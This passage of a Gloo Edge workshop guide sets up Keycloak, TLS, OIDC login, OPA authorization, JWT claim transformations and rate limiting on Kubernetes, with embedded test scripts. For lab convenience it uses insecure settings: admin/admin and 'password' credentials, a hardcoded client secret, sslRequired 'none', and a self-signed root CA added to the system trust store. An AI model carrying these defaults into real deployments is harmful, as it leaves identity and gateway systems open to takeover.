              "protocolMapper": "oidc-usermodel-attribute-mapper",
              "config": {
                "claim.name": "subscription",
                "user.attribute": "subscription",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            },
            {
              "name": "name",
              "protocol": "openid-connect",
              "protocolMapper": "oidc-usermodel-property-mapper",
              "config": {
                "claim.name": "name",
                "user.attribute": "username",
                "access.token.claim": "true",
                "id.token.claim": "true"
              }
            }
          ]
        }
      ],
      "components": {
        "org.keycloak.userprofile.UserProfileProvider": [
          {
            "providerId": "declarative-user-profile",
            "config": {
              "kc.user.profile.config": [
                "{\"attributes\":[{\"name\":\"username\"},{\"name\":\"email\"}],\"unmanagedAttributePolicy\":\"ENABLED\"}"
              ]
            }
          }
        ]
      }
    }
  portal-realm.json: |
    {
      "realm": "portal-mgmt",
      "enabled": true,
      "sslRequired": "none",
      "roles": {
        "client": {
          "gloo-portal-idp": [
            {
              "name": "uma_protection",
              "composite": false,
              "clientRole": true,
              "attributes": {}
            }
          ]
        },
        "realm": [
          {
            "name": "default-roles-portal-mgmt",
            "description": "${role_default-roles}",
            "composite": true,
            "composites": {
              "realm": [
                "offline_access",
                "uma_authorization"
              ],
              "client": {
                "account": [
                  "manage-account",
                  "view-profile"
                ]
              }
            },
            "clientRole": false,
            "attributes": {}
          },
          {
            "name": "uma_authorization",
            "description": "${role_uma_authorization}",
            "composite": false,
            "clientRole": false
          }
        ]
      },
      "users": [
        {
          "username": "service-account-gloo-portal-idp",
          "createdTimestamp": 1727724261768,
          "emailVerified": false,
          "enabled": true,
          "totp": false,
          "serviceAccountClientId": "gloo-portal-idp",
          "disableableCredentialTypes": [],
          "requiredActions": [],
          "realmRoles": [
            "default-roles-portal-mgmt"
          ],
          "clientRoles": {
            "realm-management": [
              "manage-clients"
            ],
            "gloo-portal-idp": [
              "uma_protection"
            ]
          },
          "notBefore": 0,
          "groups": []
        }
      ],
      "clients": [
        {
          "clientId": "gloo-portal-idp",
          "enabled": true,
          "name": "Solo.io Gloo Portal Resource Server",
          "clientAuthenticatorType": "client-secret",
          "secret": "gloo-portal-idp-secret",
          "serviceAccountsEnabled": true,
          "authorizationServicesEnabled": true,
          "authorizationSettings": {
            "allowRemoteResourceManagement": true,
            "policyEnforcementMode": "ENFORCING",
            "resources": [
              {
                "name": "Default Resource",
                "type": "urn:gloo-portal-idp:resources:default",
                "ownerManagedAccess": false,
                "attributes": {},
                "uris": [
                  "/*"
                ]
              }
            ],
            "policies": [
              {
                "name": "Default Policy",
                "description": "A policy that grants access only for users within this realm",
                "type": "regex",
                "logic": "POSITIVE",
                "decisionStrategy": "AFFIRMATIVE",
                "config": {
                  "targetContextAttributes" : "false",
                  "pattern" : ".*",
                  "targetClaim" : "sub"
                }
              },
              {
                "name": "Default Permission",
                "description": "A permission that applies to the default resource type",
                "type": "resource",
                "logic": "POSITIVE",
                "decisionStrategy": "UNANIMOUS",
                "config": {
                  "defaultResourceType": "urn:gloo-portal-idp:resources:default",
                  "applyPolicies": "[\"Default Policy\"]"
                }
              }
            ],
            "scopes": [],
            "decisionStrategy": "UNANIMOUS"
          }
        }
      ]
    }
kind: ConfigMap
metadata:
  name: realms
  namespace: keycloak
EOF
```

Now let's install Keycloak:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  selector:
    app: keycloak
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  replicas: 1
  selector:
    matchLabels:
      app: keycloak
  template:
    metadata:
      labels:
        app: keycloak
    spec:
      containers:
      - name: keycloak
        image: quay.io/keycloak/keycloak:25.0.5
        args:
        - start-dev
        - --import-realm
        - --proxy-headers=xforwarded
        - --features=hostname:v1
        - --hostname-strict=false
        - --hostname-strict-https=false
        env:
        - name: KEYCLOAK_ADMIN
          value: admin
        - name: KEYCLOAK_ADMIN_PASSWORD
          value: admin
        - name: KC_DB
          value: postgres
        - name: KC_DB_URL
          value: jdbc:postgresql://postgres.gloo-system.svc.cluster.local:5432/keycloak
        - name: KC_DB_USERNAME
          value: keycloak
        - name: KC_DB_PASSWORD
          value: password
        ports:
        - name: http
          containerPort: 8080
        readinessProbe:
          httpGet:
            path: /realms/workshop
            port: 8080
        volumeMounts:
        - name: realms
          mountPath: /opt/keycloak/data/import
      volumes:
      - name: realms
        configMap:
          name: realms
EOF
```

Wait while Keycloak finishes rolling out:

```bash
kubectl --context ${CLUSTER1} -n keycloak rollout status deploy/keycloak
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Keycloak", () => {
  it('keycloak pods are ready in cluster1', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "keycloak", k8sObj: "keycloak" }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/pods-available.test.js.liquid from lab number 4"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Retrieve enterprise-networking ip", () => {
  it("A value for load-balancing has been assigned", () => {
    let cli = chaiExec(`kubectl --context ${process.env.CLUSTER1} -n keycloak get svc keycloak -o jsonpath='{.status.loadBalancer}'`);
    expect(cli).to.exit.with.code(0);
    expect(cli).output.to.contain('"ingress"');
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-keycloak/tests/keycloak-ip-is-attached.test.js.liquid from lab number 4"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
-->
<!--bash
timeout 2m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n keycloak get svc keycloak -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done"
-->

Let's set the environment variables we need:

```bash
export ENDPOINT_KEYCLOAK=$(kubectl --context ${CLUSTER1} -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}'):8080
export HOST_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK%:*})
export PORT_KEYCLOAK=$(echo ${ENDPOINT_KEYCLOAK##*:})
export KEYCLOAK_URL=http://${ENDPOINT_KEYCLOAK}
```

<!--bash
cat <<'EOF' > ./test.js
const dns = require('dns');
const chaiHttp = require("chai-http");
const chai = require("chai");
const expect = chai.expect;
chai.use(chaiHttp);
const { waitOnFailedTest } = require('./tests/utils');

afterEach(function(done) { waitOnFailedTest(done, this.currentTest.currentRetry())});

describe("Address '" + process.env.HOST_KEYCLOAK + "' can be resolved in DNS", () => {
    it(process.env.HOST_KEYCLOAK + ' can be resolved', (done) => {
        return dns.lookup(process.env.HOST_KEYCLOAK, (err, address, family) => {
            expect(address).to.be.an.ip;
            done();
        });
    });
});
EOF
echo "executing test ./default/tests/can-resolve.test.js.liquid from lab number 4"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 4"; exit 1; }
-->
<!--bash
echo "Waiting for Keycloak to be ready at $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token"
timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $KEYCLOAK_URL/realms/workshop/protocol/openid-connect/token)" != "405" ]]; do printf '.';sleep 1; done' || false
-->



## Lab 5 - Security and authentication <a name="lab-5---security-and-authentication-"></a>



In this step, you will explore some of the Gloo Edge features related to security and authentication.

## Network Encryption - Server TLS

Traffic routes through many networking devices until it reaches the intended service. It is key for the traffic to be encrypted while traveling through these networking devices, and only the server should be able to decrypt and read the contents. For that reason, you need to secure your application using TLS.

Let's first create a private key and a self-signed certificate to be used in your virtual service:

<!--bash
  sudo rm -rf /etc/ssl/certs/root-ca.pem
  sudo rm -rf /usr/local/share/ca-certificates/root-ca.crt
  sudo update-ca-certificates
-->

```bash
pushd $(mktemp -d)

## Create Root CA
step certificate create root-ca-edge root-ca.crt root-ca.key \
  --profile root-ca --no-password --insecure --not-after 87600h --kty RSA

## Create httpbin certificate
step certificate create httpbin.solo.io tls.crt tls.key --ca root-ca.crt \
    --ca-key root-ca.key --not-after 8760h --no-password --insecure \
    --san httpbin.solo.io --kty RSA

# To fix CURL add the root ca to the system trusted CA's
sudo cp root-ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

For chrome to trust the certificates signed by the root ca import it in the following location:

Open chrome at the following path: chrome://settings/certificates
Switch to 'Authorities' and Import the Root CA.

For Gloo Edge to make use of the certificate and the private key we need to store those as Kubernetes Secrets using the following command:

```bash
kubectl create secret tls upstream-tls --key tls.key \
   --cert tls.crt --namespace gloo-system

popd
```

With the secret created you have to update the virtual service to use it:

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
# ---------------- SSL config ---------------------------
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
# -------------------------------------------------------
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
        delegateAction:
          selector:
            namespaces:
              - echo
            labels:
              application-owner: team1
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
EOF
```

Now the application is securely exposed through TLS. Open it in the browser using HTTPS.
```
/opt/google/chrome/chrome https://httpbin.solo.io
```

If you've added the Root CA certificate to your browser you will see the green key in the address bar, which indicates that the authentication of the server succeeded and that the connection is encrypted and secure.

Use curl to invoke an https endpoint of the httpbin service, like the one below.

```bash,noexecute
curl https://httpbin.solo.io/get
```

Besides authenticating the server, another important authentication is of the client (or end-user) before it is permitted to query information or make changes.

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("httpbin is available (https)", () => {
  it('is available', () => helpers.checkURL({ host: `https://httpbin.solo.io`, retCode: 200 }));
})

EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/security-and-authentication/tests/https.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
-->

## Authentication with OIDC (OpenID Connect)

In many use cases, you need to restrict the access to your applications to only authenticated users.

OIDC (OpenID Connect) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.

The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.

In this step, you will secure the **httpbin** application using an OIDC Identity Provider.

The architecture looks like this now when omitting the `echo` services:

![Bookinfo with OIDC](images/steps/gloo-edge/security-and-authentication/keycloak-oidc.png)

> **Note:** Another alternative to configuring JWT authentication and authorization is explained here: https://docs.solo.io/gloo-edge/latest/guides/security/auth/jwt/access_control/#secure-the-virtual-service. This, however, requires the client to provide the JWT token (and as well store it properly into an HttpOnly cookie)

The next step is to create an AuthConfig, which is a Gloo Edge CRD that contains authentication information:

```bash
kubectl apply -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: gloo-system
spec:
  configs:
  - oauth2:
      oidcAuthorizationCode:
        appUrl: https://httpbin.solo.io
        callbackPath: /callback
        clientId: ${KEYCLOAK_CLIENT}
        clientSecretRef:
          name: oauth
          namespace: gloo-system
        issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
        session:
          failOnFetchFailure: true
          redis:
            cookieName: keycloak-session
            options:
              host: redis:6379
        scopes:
        - email
        headers:
          idTokenHeader: jwt
EOF
```

Finally, activate the authentication on the virtual service by referencing the AuthConfig:

> Notice that this only applies to httpbin, because it is configured within a **matcher**

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - '*'
    routes:
      - matchers:
        - prefix: /
          headers:
          - name: ":authority"
            value: "echo.solo.io"
        delegateAction:
          selector:
            namespaces:
              - echo
            labels:
              application-owner: team1
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
        options:
          extauth:
            configRef:
              name: oauth
              namespace: gloo-system
EOF
```

If you refresh the web browser for the **httpbin** application, you will be redirected to the authentication challenge. If you have closed the window open a new one:
```
/opt/google/chrome/chrome https://httpbin.solo.io/
```

After authenticating with the username: `user1` and password: `password` Gloo will redirect you back to the **httpbin** application.

![Keycloak Authentication Dialog](images/steps/gloo-edge/security-and-authentication/keycloak-authentication-dialog.png)

After authenticating the user we can determine what they are authorized to access. We will investigate that right after we refactor the current resources some bit.

<!--bash
ATTEMPTS=1
timeout 60 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://httpbin.solo.io/get)" != "302" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" user2)
export ADMIN1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" admin1)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" user1)
done
ATTEMPTS=1
until ([ ! -z "$ADMIN1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export ADMIN1_COOKIE=$(node tests/keycloak-token.js "https://httpbin.solo.io/get" admin1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"
echo "Admin1 token: $ADMIN1_COOKIE"
-->

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function() {
  const cookieString = process.env.USER1_COOKIE;

  it("The httpbin page isn't accessible without authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.solo.io`, path: '/get', retCode: 302 }));

  it("The httpbin page is accessible after authenticating", () => helpersHttp.checkURL({ host: `https://httpbin.solo.io`, path: '/get', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/security-and-authentication/tests/authentication.test.js.liquid from lab number 5"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 5"; exit 1; }
-->

## Refactor time

If we configure one Virtual Service with all the hostnames and all the routing information it will quickly grow to a point that it is untenable.

A very simple rule to adhere to when creating Virtual Services is to create one virtual service per hostname or related group of hostnames that share a common configuration.
In our instance the `httpbin` and the `echo` service don't share anything in common, so we can break this into two Virtual Services, one for each service.

Start by cleaning up the current virtual service.

```bash
kubectl delete virtualservice vs -n gloo-system
```

Next, create one virtual service to represent each hostname. Start with the echo service.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-echo
  namespace: gloo-system
spec:
  virtualHost:
    domains:
      - 'echo.solo.io'
    routes:
      - matchers:
        - prefix: /
        delegateAction:
          selector:
            namespaces:
              - echo
            labels:
              application-owner: team1
EOF
```

And proceed to create the virtual service for httpbin.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - 'httpbin.solo.io'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    options:
      extauth:
        configRef:
          name: oauth
          namespace: gloo-system
EOF
```

The above definitions have a few more changes. We removed the SSL configuration for the `echo` service and we moved the options block in the `vs-httpbin` virtual service from the specific route to the `virtualHost` property, where it applies to all routes of this host.




## Lab 6 - OPA authorization <a name="lab-6---opa-authorization-"></a>



After authenticating an end-user request, we can make use of the validated information (claims, profile information, and so on) to authorize his actions. For example, let's allow users to only have READ permissions meanwhile the administrator is allowed to make changes as well.

Gloo Edge uses the [OPA (Open Policy Agent)](https://www.openpolicyagent.org/) and its Rego rules to implement complex access control.

This model allows you to get fine-grained control over the authorization in your applications. Furthermore, this model is well adopted by the Kubernetes community.

The Rego rules are stored as `ConfigMaps`.
For example with the rego rule below we allow all requests with the HTTP method `GET`, meanwhile, any other HTTP methods require that the JWT token has the `group` claim with the value `"admin"`

Apply the policy to the cluster.

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-access-control
  namespace: gloo-system
data:
  policy.rego: |-
    package test

    default allow = false

    allow {
        input.http_request.method == "GET"
    }

    allow {
        [header, payload, signature] = io.jwt.decode(input.state.jwt)
        payload["group"] == "admin"
    }
EOF
```

Next update the `AuthConfig` definition that we created in previous Labs, to make use of the rego rule.

```bash
kubectl apply -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: oauth
  namespace: gloo-system
spec:
  configs:
  - oauth2:
      oidcAuthorizationCode:
        appUrl: https://httpbin.solo.io
        callbackPath: /callback
        clientId: ${KEYCLOAK_CLIENT}
        clientSecretRef:
          name: oauth
          namespace: gloo-system
        issuerUrl: "${KEYCLOAK_URL}/realms/workshop/"
        session:
          failOnFetchFailure: true
          redis:
            cookieName: keycloak-session
            options:
              host: redis:6379
        scopes:
        - email
        headers:
          idTokenHeader: jwt
  - opaAuth:
      modules:
      - name: httpbin-access-control
        namespace: gloo-system
      query: "data.test.allow == true"
EOF
```

Let's see how this impacts the application.
```
/opt/google/chrome/chrome https://httpbin.solo.io/
```
After logging in with `user1` / `password` you will be able to view the httpbin UI. As well as send GET requests.

However, when logging in with an administrator account (`admin1` / `password` credentials), you will be able to make POST requests too.

Try that out by opening an incognito window.
```
/opt/google/chrome/chrome https://httpbin.solo.io --incognito
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("user1 who is a regular user", function() {
  const cookieString = process.env.USER1_COOKIE;
  
  it("is authorized to make GET requests", () => helpersHttp.checkWithMethod({ host: `https://httpbin.solo.io`, path: "/get", headers: [{ key: 'Cookie', value: cookieString }], method: "get", retCode: 200 }));
  
  it("is denied to make POST requests", () => helpersHttp.checkWithMethod({ host: `https://httpbin.solo.io`, path: "/post", headers: [{ key: 'Cookie', value: cookieString }], method: "post", retCode: 403 }));
});

describe("admin1 who is an administrator", function() {
  const cookieString = process.env.ADMIN1_COOKIE;
  
  it("is authorized to make POST requests", () => helpersHttp.checkWithMethod({ host: `https://httpbin.solo.io`, path: "/post", headers: [{ key: 'Cookie', value: cookieString }], method: "post", retCode: 200 }));
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/opa-authorization/tests/authorization.test.js.liquid from lab number 6"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 6"; exit 1; }
-->




## Lab 7 - Data Transformations - Request transformations <a name="lab-7---data-transformations---request-transformations-"></a>

In this section, you will explore how to transform requests using Gloo Edge. You will frequently encounter requirements that some information has to be added in the request. Frequently, it is not an application concern, such as rate-limiting user requests, validating the response that is sent to the user, returning a good-looking '404' page, and so on.

The example that we will take in the labs that follow is to rate limit our users based on the email, on their subscription, and the organization.

The information of the email and the subscription are present in the JWT tokens. So we need to use the request transformation capabilities of Gloo Edge to extract those claims and mount those into the request.

## Extract JWT claims and store them in HTTP headers

To extract JWT claims and store those in the request headers we got to use the `jwtStaged` property. After authenticating the request this property can be configured to extract the token claims and store those as HTTP Headers. As shown below:

```bash
export KEYCLOAK_MASTER_REALM_URL=http://$(kubectl -n keycloak get svc keycloak -ojsonpath='{.status.loadBalancer.ingress[0].ip}'):8080/realms/workshop

kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - 'httpbin.solo.io'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    options:
      extauth:
        configRef:
          name: oauth
          namespace: gloo-system
      jwtStaged:
        afterExtAuth:
          providers:
            keycloak:
              issuer: ${KEYCLOAK_MASTER_REALM_URL}
              keepToken: true
              tokenSource:
                headers:
                - header: jwt
              claimsToHeaders:
              - claim: email
                header: x-email
              - claim: subscription
                header: x-subscription
              jwks:
                remote:
                  url: http://keycloak.keycloak.svc:8080/realms/workshop/protocol/openid-connect/certs
                  upstreamRef:
                    name: keycloak-keycloak-8080
                    namespace: gloo-system
EOF
```

To verify that the headers were added hit the following endpoint:
```
/opt/google/chrome/chrome https://httpbin.solo.io/get
```

Your output too should contain the `X-Email`, `X-Subscription` headers.

```json,nocopy
{
  "args": {},
  "headers": {
    "Host": "httpbin.solo.io",
    "Jwt": "<REDACTED>",
      ...
    "X-Email": "user1@acme.com",
    "X-Subscription": "enterprise",
    "X-User-Id": "http://172.18.254.176:8080/realms/workshop;32a4c5b7-275a-4084-bb0f-ac4568c0d24f"
  },
  "origin": "10.244.0.8",
  "url": "https://httpbin.solo.io/get"
}
```

## Staged transformations

We need another piece of information in the header and that is the organization. However, the organization is not stored as a claim in the user token. But on closer look, we find out that we can derive the organization from the email! Basically, `user1@acme.com` is a member of the ACME organization.

Gloo Edge enables us to use request transformers that extract information from the request using regex-es.

For this, we got to use Staged Transformers and the transformation MUST occur after the email claim is extracted from the JWT and stored into the header `X-Email`.

The diagram below shows the order in which filters are applied to a request.

![Order of filters applied to a request](images/steps/gloo-edge/request-transformation/order-of-filters.png)

To extract the organization from the email header, we got to use the "Regular Transformations" as shown in the image. The regular transfomrations are executed after the JWT stage (as shown in the image).

Putting this together we come up with the virtual service defined below.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - 'httpbin.solo.io'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    options:
      extauth:
        configRef:
          name: oauth
          namespace: gloo-system
# ---------------- Response Transformation ------------------
      stagedTransformations:
        regular:
          requestTransforms:
          - requestTransformation:
              transformationTemplate:
                extractors:
                  organization:
                    header: 'X-Email'
                    regex: '.*@(.*)$'
                    subgroup: 1
                headers:
                  x-organization:
                    text: '{{ organization }}'
#------------------------------------------------------
      jwtStaged:
        afterExtAuth:
          providers:
            keycloak:
              issuer: ${KEYCLOAK_MASTER_REALM_URL}
              keepToken: true
              tokenSource:
                headers:
                - header: jwt
              claimsToHeaders:
              - claim: email
                header: x-email
              - claim: subscription
                header: x-subscription
              jwks:
                remote:
                  url: http://keycloak.keycloak.svc:8080/realms/workshop/protocol/openid-connect/certs
                  upstreamRef:
                    name: keycloak-keycloak-8080
                    namespace: gloo-system
EOF

```

Now let's print all the headers by querying the `/get` endpoint of `httpbin`.
```
/opt/google/chrome/chrome https://httpbin.solo.io/get
```

You should see the following output in your browser.

```json,nocopy
{
  "args": {},
  "headers": {
    "Cookie": "id_token=<REDACTED>",
    "Host": "httpbin.solo.io",
    "Jwt": "<REDACTED>",
    "X-Email": "user1@acme.com",
    "X-Organization": "acme.com",
    "X-Subscription": "enterprise",
    "X-User-Id": "http://172.18.254.176:8080/realms/workshop;e2801a4d-cfc9-479e-9361-7db43d0b4b37"
  },
}
```

The output shows that the email, organization, and subscription are all set in the headers, and can be used for rate-limiting.

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("The request is transformed", function() {
  const cookieString = process.env.USER1_COOKIE;
  
  it("has added the X-Email header", () => helpersHttp.checkBody({ host: `https://httpbin.solo.io`, path: "/get", headers: [{ key: 'Cookie', value: cookieString }], body: "X-Email", retCode: 200 }));
  
  it("has added the X-Subscription header", () => helpersHttp.checkBody({ host: `https://httpbin.solo.io`, path: "/get", headers: [{ key: 'Cookie', value: cookieString }], body: "X-Subscription", retCode: 200 }));

  it("has added the X-Organization header", () => helpersHttp.checkBody({ host: `https://httpbin.solo.io`, path: "/get", headers: [{ key: 'Cookie', value: cookieString }], body: "X-Organization", retCode: 200 }));
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/imported/gloo-edge/templates/steps/request-transformation/tests/transformations.test.js.liquid from lab number 7"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 7"; exit 1; }
-->




## Lab 8 - Rate limiting <a name="lab-8---rate-limiting-"></a>



In this step, you are going to use rate-limiting to protect or monetize your services.

In our example with `httpbin` we want to achieve the following rate limit configuration:
* Users of organizations with the `enterprise` subscription have a rate limit of 8 requests per second
* Users of organizations with the `free` subscription have a rate limit of 2 requests per second

We define those rate limits using the following RateLimitConfig definition:

```bash
kubectl apply -f - << EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: limit-users
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
    - simpleDescriptors:
      - key: email-key
      - key: organization-key
      - key: subscription-key
        value: free
      rateLimit:
        requestsPerUnit: 2
        unit: MINUTE
    - simpleDescriptors:
      - key: email-key
      - key: organization-key
      - key: subscription-key
        value: enterprise
      rateLimit:
        requestsPerUnit: 8
        unit: MINUTE
    rateLimits:
    - setActions:
      - requestHeaders:
          headerName: x-email
          descriptorKey: email-key
      - requestHeaders:
          headerName: x-organization
          descriptorKey: organization-key
      - requestHeaders:
          headerName: x-subscription
          descriptorKey: subscription-key
EOF
```

Now let's update the virtual service to make use of the new rate limit.

```bash
kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualService
metadata:
  name: vs-httpbin
  namespace: gloo-system
spec:
  sslConfig:
    secretRef:
      name: upstream-tls
      namespace: gloo-system
  virtualHost:
    domains:
      - 'httpbin.solo.io'
    routes:
      - matchers:
          - prefix: /
        routeAction:
          single:
            upstream:
              name: httpbin-httpbin-8000
              namespace: gloo-system
    options:
      extauth:
        configRef:
          name: oauth
          namespace: gloo-system
      stagedTransformations:
        regular:
          requestTransforms:
          - requestTransformation:
              transformationTemplate:
                extractors:
                  organization:
                    header: 'X-Email'
                    regex: '.*@(.*)$'
                    subgroup: 1
                headers:
                  x-organization:
                    text: '{{ organization }}'
      jwtStaged:
        afterExtAuth:
          providers:
            keycloak:
              issuer: ${KEYCLOAK_MASTER_REALM_URL}
              keepToken: true
              tokenSource:
                headers:
                - header: jwt
              claimsToHeaders:
              - claim: email
                header: x-email
              - claim: subscription
                header: x-subscription
              jwks:
                remote:
                  url: http://keycloak.keycloak.svc:8080/realms/workshop/protocol/openid-connect/certs
                  upstreamRef:
                    name: keycloak-keycloak-8080
                    namespace: gloo-system
# ---------------- Rate limit config ------------------
      rateLimitConfigs:
        refs:
        - name: limit-users
          namespace: gloo-system
#------------------------------------------------------
EOF

```

With the rate limit applied open the browser, login with `user1` and send 8 requests by just refreshing the page:
```
/opt/google/chrome/chrome https://httpbin.solo.io/get
```

You will see that on the 9th request you will see a 429 status code. Which stands for "Too Many Requests".

![Browser 429 Too Many Requests Interface](images/steps/gloo-edge/rate-limiting/429.png)

## Refactor time!

The VirtualService options can be extracted in their own resource called `VirtualHostOptions`. Usually, used when the same set of options has to be applied across different virtual services.

Start by creating the `VirtualHostOption` that contains the extauth, the transformations, and the rate-limiting configuration.

```bash

kubectl apply -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: VirtualHostOption
metadata:
